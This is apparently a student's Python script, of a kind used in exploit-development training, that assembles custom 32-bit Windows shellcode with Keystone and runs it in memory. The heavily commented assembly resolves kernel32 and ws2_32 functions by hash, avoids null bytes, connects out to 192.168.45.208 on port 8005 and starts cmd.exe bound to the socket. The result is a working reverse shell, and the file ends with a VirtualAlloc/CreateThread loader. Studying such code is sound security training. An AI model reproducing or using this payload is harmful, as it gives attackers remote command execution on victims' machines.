import ctypes, struct
from keystone import *


CODE = (
# 1. ##### Starting point, move stack pointer and create buffer space ######
        "start:                  " #
        "   int3                ;" # DEBUGGING PURPOSES: Interrupt exec to attach debugger
        "   mov ebp, esp        ;" # move up the base pointer to imitate a function call
        "   add esp, 0xfffff9f0 ;" # move up the stack pointer making a buffer to hold structure pushes (adds a negative number to avoid null bytes)

# 2. ##### Find the base address of KERNEL32 through the PEB ######

        "find_kernel32:          " #
        "   xor ecx, ecx        ;" # zero out ecx
        "   mov esi,fs:[ecx+30h];" # get the PEB address (30h into the TEB)
        "   mov esi, [esi+0Ch]  ;" # get the Ldr address from PEB
        "   mov esi, [esi+1Ch]  ;" # get the InItOrder first link address from Ldr

        "next_module:            " #
        "   mov ebx, [esi+8h]   ;" # get the module base address of the linked entry
        "   mov edi, [esi+20h]  ;" # get the module name
        "   mov esi, [esi]      ;" # get the flink entry
        "   cmp [edi+12*2], cx  ;" # check for null byte at word 13 (byte 26) of module name (KERNEL32.DLL)
        "   jne next_module     ;" # move on to next module if no match

# 3. ##### Dynamically calculate the absolute address for find_function ######

        "find_function_shorten:  " # 
        "   jmp find_function_shorten_bnc;" # jump to a location after find_function_ret

        "find_function_ret:      " #
        "   pop esi             ;" # get find_function address
        "   mov [ebp+0x04], esi ;" # move find_function address on the stack for later calls
        "   jmp resolve_symbols_kernel32;" # jump to entry symbol (function) finding logic

        "find_function_shorten_bnc:" # 
        "   call find_function_ret;" # call upwards to save this address + 1 (find_function) on the stack

# a. ##### Traverse the PE to get KERNEL32 function names ###### 

        "find_function:          " #
        "   pushad              ;" # push registers to the stack for later
        "   mov eax, [ebx+0x3c] ;" # get the PE header address from the DOS Header
        "   mov edi, [ebx+eax+0x78] ;" # get the Export Directory Table RVA from the PE header
        "   add edi, ebx        ;" # get the VMA of the EDT
        "   mov ecx, [edi+0x18] ;" # get the NumberOfNames (for use as a counter)
        "   mov eax, [edi+0x20] ;" # get the AddressOfNames RVA
        "   add eax, ebx        ;" # get the VMA of AddressOfNames
        "   mov [ebp-4], eax    ;" # save the AddressOfNames VMA on the stack

        "find_function_loop:     "
        "   jecxz find_function_finished ;" # jump to cleanup if ecx (counter) is 0
        "   dec ecx             ;" # decrement the NumberOfNames counter
        "   mov eax, [ebp-4]    ;" # restore the AddressOfNames VMA
        "   mov esi, [eax+ecx*4];" # get the nth (counter) function name RVA (VMA+counter*DWORD ptr)
        "   add esi, ebx        ;" # get the VMA of the function name 

# b. ##### Generate a hash to compare to pre-gen hash ######

        "hash_prep:              " #
        "   xor eax, eax        ;" # zero out eax
        "   cdq                 ;" # set edx equal to eax (zero out)
        "   cld                 ;" # clear direction flag (when DF=0 string ops increment ESI/EDI)
        
        "hash_loop:              " # 
        "   lodsb               ;" # load next byte from string buffer (esi) into al
        "   test al, al         ;" # bitwise AND, sets ZF to 0 if al is 0 (null terminator)
        "   jz hash_finished    ;" # jumps out of loop if at end of string
        "   ror edx, 0x0d       ;" # rotate edx (hash accumulator) 13 bytes right
        "   add edx, eax        ;" # add next string byte into the accumulation
        "   jmp hash_loop       ;" # repeat if not the end

        "hash_finished:          " #
    
# c. ##### Compare hashes and calculate function address on match ######    

        "find_function_compare:  " #
        "   cmp edx, [esp+0x24] ;" # compare the pre-gen and newly generated hash
        "   jnz find_function_loop  ;" # jump back to find function logic if not a match
        "   mov edx, [edi+0x24] ;" # get AddressOfNameOrdinals RVA
        "   add edx, ebx        ;" # get AddressOfNameOrdinals VMA
        "   mov cx, [edx+2*ecx] ;" # overwrite names index with value from ...NameOrdinals[index]  
        "   mov edx, [edi+0x1c] ;" # get AddressOfFunctions RVA
        "   add edx, ebx        ;" # get AddressOfFunctions VMA
        "   mov eax, [edx+4*ecx];" # overwrite ordinal index with RVA of desired function
        "   add eax, ebx        ;" # get desired function VMA
        "   mov [esp+0x1c], eax ;" # overwrite pushad register value of eax with the function VMA

        "find_function_finished: "
        "   popad               ;" # restore original register values
        "   ret                 ;" # 

# 4. ##### Upward calls to find_function on kernel32.dll ######

        "resolve_symbols_kernel32: " #
        "   push 0x78b5b983     ;" # push pre-generated hash for TerminateProcess to stack
        "   call dword ptr [ebp+0x04];" # call find_function using its absolute address on stack
        "   mov [ebp+0x10], eax ;" # move find_function return value (TerminateProcess addr) to stack 
        "   push 0xec0e4e8e     ;" # push pre-gen hash for LoadLibraryA
        "   call dword ptr [ebp+0x04];" # call find_function
        "   mov [ebp+0x14], eax ;" # move find_function return value (LoadLibraryA addr) to stack
        "   push 0x16b3fe72     ;" # push pre-gen hash for CreateProcessA
        "   call dword ptr [ebp+0x04];" # call find_function
        "   mov [ebp+0x18], eax ;" # move find_function return value (CreateProcessA addr) to stack

# 5. ##### LoadLibraryA on ws2_32.dll and find_functions within ws2_32.dll ######

        "load_ws2_32:            " #
        "   xor eax, eax        ;" # zero out eax
        "   mov ax, 0x6c6c      ;" # move the "ll" of "ws2_32.dll" with null terminators
        "   push eax            ;" # push the "ll\0\0"
        "   push 0x642e3233     ;" # push the 2nd byte of the string
        "   push 0x5f327377     ;" # push the 1st byte of the string
        "   push esp            ;" # push the pointer the pushed string (what LoadLibraryA actually wants)
        "   call dword ptr [ebp+0x14];" # call LoadLibraryA

        "resolve_symbols_ws2_32: " # 
        "   mov ebx, eax        ;" # move return value (base addr) from LoadLibraryA into ebx
        "   push 0x3bfcedcb     ;" # push pre-gen WSAStartup hash
        "   call dword ptr [ebp+0x04];" # call find_function
        "   mov [ebp+0x1C], eax ;" # move return value (WSAStartup addr) to stack
        "   push 0xadf509d9     ;" # push pre-gen WSASocketA hash
        "   call dword ptr [ebp+0x04];" # call find_function
        "   mov [ebp+0x20], eax ;" # move return value (WSASocketA addr) to stack
        "   push 0xb32dba0c     ;" # push pre-gen WSAConnect hash
        "   call dword ptr [ebp+0x04];" # call find_function
        "   mov [ebp+0x24], eax ;" # move return value (WSAConnect addr) to stack

# 6. ##### Set up stack and make calls to socket API functions ######

        "call_wsastartup:        " #
        "   mov eax, esp        ;" # move the stack pointer into eax for manipulation
        "   mov cx, 0x590       ;" # move a large number to cx to be subtracted from eax (temp stack pointer)
        "   sub eax, ecx        ;" # subtract so eax addresses to a location high on the stack. This will point to the WSAData struct needed by this and later syscalls. Putting it high on stack prevents corruption later. 
        "   push eax            ;" # push the WSAData struct pointer to the stack
        "   xor eax, eax        ;" # zero out
        "   mov ax, 0x0202      ;" # move "22" meaning version 2.2 to register
        "   push eax            ;" # push the Version value to the stack
        "   call dword ptr [ebp+0x1C];" # call WSAStartup from stack address

        "call_wsasocketa:        " #
        "   xor eax, eax        ;" # zero out
        "   push eax            ;" # push dwFlags as null
        "   push eax            ;" # push g (group) as null
        "   push eax            ;" # push lpProtocolinfo as null (so it uses a default)
        "   mov al, 0x06        ;" # move into eax 6 with 0's pre-padding
        "   push eax            ;" # push protocol as IPPROTO_TCP (6)
        "   sub al, 0x05        ;" # sub 5 to get value 1 with 0 pre-padding
        "   push eax            ;" # push type as SOCK_STREAM (1)
        "   inc eax             ;" # increment 1 to get value of 2
        "   push eax            ;" # push af as AF_INET (2)
        "   call dword ptr [ebp+0x20];" # call WSASocketA from stack address
        
        "call_wsaconnect:        " #
        "   mov esi, eax        ;" # move socket descriptor (returned by WSASocketA) to esi
        "   xor eax, eax        ;" # zero out
        "   push eax            ;" # push byte 1 of sin_zero[8] as null
        "   push eax            ;" # push byte 2 of sin_zero[8] as null
        "   push 0xd02da8c0     ;" # push ip addr, 192.168.45.208, each number is 1 byte 
        "   mov ax, 0x451f      ;" # move in port number, 8005, to lower 2 bytes
        "   shl eax, 0x10       ;" # shift port segment of dword to higher 2 bytes
        "   add ax, 0x02        ;" # add in 2 (AF_INET) to same byte as the sin_family
        "   push eax            ;" # push
        "   push esp            ;" # push current stack pointer, the pointer to this sockaddr_in struct
        "   pop edi             ;" # pop it into edi for later
        "   xor eax, eax        ;" # zero out
        "   push eax            ;" # push lpGQOS as null
        "   push eax            ;" # push lpSQOS as null
        "   push eax            ;" # push lpCalleeData as null
        "   push eax            ;" # push lpCallerData as null
        "   mov al, 0x10        ;" # move in 0x10 (16) as namelen to lower byte of eax
        "   push eax            ;" # push eax as namelen
        "   push edi            ;" # push saved sockaddr_in pointer 
        "   push esi            ;" # push saved socket descriptor 
        "   call dword ptr [ebp+0x24];" # call WSAConnect

# 7. ##### Set up stack (arguments and substructures) and call to CreateProcessA  ######

        "create_startupinfoa:   ;" #
        "   push esi            ;" # push hStdError as socket descriptor in esi
        "   push esi            ;" # push hStdOutput as socket descriptor
        "   push esi            ;" # push hStdInput as socket descriptor
        "   xor eax, eax        ;" # zero out
        "   push eax            ;" # push lpReserved2 as null
        "   push eax            ;" # cbReserved2 AND wShowWindow (1 WORD each)
        "   add al, 0x10        ;" # add 0x10 to eax, sets up dwFlags value of 0x100 (STARTF_USESTDHANDLES)
        "   shl eax, 0x04       ;" # shift 0x10 left once to get 0x100
        "   push eax            ;" # push dwFlags as 0x100
        "   xor eax, eax        ;" # zero out
        "   push eax            ;" # dwFillAttribute
        "   push eax            ;" # dwYCountChars
        "   push eax            ;" # dwXCountChars
        "   push eax            ;" # dwYSize
        "   push eax            ;" # dwXSize
        "   push eax            ;" # dwY
        "   push eax            ;" # dwX
        "   push eax            ;" # lpTitle
        "   push eax            ;" # lpDesktop
        "   push eax            ;" # lpReserved
        "   add al, 0x44        ;" # add 0x44 (length of STARTUPINFOA) into eax
        "   push eax            ;" # push cb as 0x44 (0n68)
        "   push esp            ;" # push current stack pointer, pointer to this lpStartupInfo struct
        "   pop edi             ;" # pop this pointer into edi

        "create_cmd_string:      "
        "   mov eax, 0xff9a879b ;" # move the negation of the last byte of the command "exe\0"
        "   neg eax             ;" # negate it back, avoiding null bytes
        "   push eax            ;" # push the last byte of the command
        "   push 0x2e646d63     ;" # push the first byte of the command "cmd."
        "   push esp            ;" # push current stack pointer, pointer to this command string
        "   pop ebx             ;" # pop this pointer into ebx

        "call_createprocessa:    " #
        "   mov eax, esp        ;" # copy stack pointer to eax
        "   xor ecx, ecx        ;" # zero out
        "   mov cx, 0x390       ;" # add an arbitrary value to ecx, representing an offset upwards on stack
        "   sub eax, ecx        ;" # subtract this offset creating a location on stack for a struct
        "   push eax            ;" # push this stack location as lpProcessInformation (populated by syscall)
        "   push edi            ;" # push lpStartUpInfo using struct stored in edi
        "   xor eax, eax        ;" # zero out
        "   push eax            ;" # lpCurrentDirectory
        "   push eax            ;" # lpEnvironment
        "   push eax            ;" # dwCreationFlags
        "   inc eax             ;" # set eax to 1
        "   push eax            ;" # push bInheritHandles as 1 (True)
        "   dec eax             ;" # zero out eax
        "   push eax            ;" # lpThreadAttributes
        "   push eax            ;" # lpProcessAttributes
        "   push ebx            ;" # push lpCommandLine using string pointer stored in ebx
        "   push eax            ;" # lpApplicationName
        "   call dword ptr [ebp+0x18];" # call CreateProcessA

# 8. ##### Set up and system call to TerminateProcess ######

        "call_terminateprocess:  " #
        "   xor ecx, ecx        ;" # zero out ecx
        "   push ecx            ;" # push uExitCode arg as 0 for syscall
        "   push 0xffffffff     ;" # push hProcess arg as -1 (psuedo-handle)
        "   call dword ptr [ebp+0x10];" # call TerminateProcess using its address on the stack

        )


### generate shellcode ###
# init engine in x86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
sh = b""
for e in encoding:
    sh += struct.pack("B", e) # add each byte object from an unsigned char (B)
shellcode = bytearray(sh)


### makes the shellcode executable ###
# allocate mem page with PAGE_EXEC_READWRITE perms, returns a pointer
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3004),
                                          ctypes.c_int(0x40))
# tbh not sure here, but makes a ctype compatible buffer space from the shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
# move the buffer into the memory page
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))


### executes the shellcode ###
print("Shellcode located at address %s" % hex(ptr))
input("...PRESS ENTER TO EXECUTE SHELLCODE...")
# creates the thread environment for the shellcode to run
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
